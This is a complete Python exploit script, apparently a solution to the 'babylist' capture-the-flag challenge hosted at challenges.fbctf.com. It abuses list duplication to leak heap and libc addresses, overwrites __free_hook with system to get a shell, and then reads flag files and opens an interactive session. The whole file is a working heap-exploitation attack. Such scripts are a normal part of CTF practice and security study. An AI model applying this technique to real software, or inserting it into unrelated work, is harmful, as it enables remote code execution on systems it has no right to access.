#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './babylist'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'challenges.fbctf.com', 'port':1343})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = None)
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn, **kwargs):
    bl = BabyList(conn)

    bl.create_list('0'*8)   # 0
    for i in range(4):
        bl.add(0, i)

    bl.duplicate(0, 'X'*8)  # 1

    for i in range(4, 0x20):
        bl.add(0, i)

    _, v = bl.view(1, 0)
    addr_heap_base = v - 0x11f20
    _, v = bl.view(1, 1)
    addr_heap_base += v << 32
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    bl.duplicate(0, 'A'*8)  # 2
    bl.add(0, 0xdead)
    bl.add(2, 0xdead)

    for i in range(4, 0x10):
        bl.add(1, 0)

    bl.create_list(p64(addr_heap_base + 0x12050))   # 3
    bl.create_list(p64(addr_heap_base + 0x12020))   # 4

    bl.add(1, 0xcafe)
    bl.delete(3)

    _, v = bl.view(1, 0)
    addr_libc_mainarena = (u(p(v)) - 0x60) & ((1<<32)-1)
    _, v = bl.view(1, 1)
    addr_libc_mainarena += v << 32
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_free_hook = libc.symbols['__free_hook']
    addr_libc_system    = libc.sep_function['system']
    addr_libc_str_sh    = next(libc.search('/bin/sh'))

    bl.create_list('Y'*8)   # 3
    bl.add(3, (addr_heap_base+0x1000) & ((1<<32)-1))

    bl.add(1, 0)
    bl.add(1, addr_libc_free_hook & ((1<<32)-1))
    bl.add(1, addr_libc_free_hook >> 32)
    bl.add(3, addr_libc_system & ((1<<32)-1))
    bl.add(3, addr_libc_system >> 32)

    bl.create_list('Z'*8)   # 5
    bl.add(5, u('sh'))
    bl.add(5, 0)

    conn.sendline('cat /home/*/flag')

class BabyList:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def create_list(self, name):
        self.sendlineafter('> ', '1')
        self.sendlineafter('list:\n', name)
        '''
        self.sendline('1')
        self.sendline(name)
        '''

    def add(self, idx, val):
        '''
        self.sendlineafter('> ', '2')
        self.sendlineafter('list:\n', str(idx))
        self.sendlineafter('add:\n', str(struct.unpack('<l', p32(val))[0]))
        '''
        self.sendline('2')
        self.sendline(str(idx))
        self.sendline(str(struct.unpack('<l', p32(val))[0]))

    def view(self, idx1, idx2):
        self.sendlineafter('> ', '3')
        self.sendlineafter('list:\n', str(idx1))
        self.sendlineafter('list:\n', str(idx2))
        '''
        self.sendline('3')
        self.sendline(str(idx1))
        self.sendline(str(idx2))
        '''
        name = self.recvuntil('[%d] = ' % idx2, drop=True)
        val = int(self.recvuntil('\n', drop=True))
        return name, val

    def duplicate(self, idx, name):
        self.sendlineafter('> ', '4')
        self.sendlineafter('list:\n', str(idx))
        self.sendlineafter('list:\n', name)
        '''
        self.sendline('4')
        self.sendline(str(idx))
        self.sendline(name)
        '''

    def delete(self, idx):
        self.sendlineafter('> ', '5')
        self.sendlineafter('list:\n', str(idx))
        '''
        self.sendline('5')
        self.sendline(str(idx))
        '''

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.connection.interactive()
    
#==========
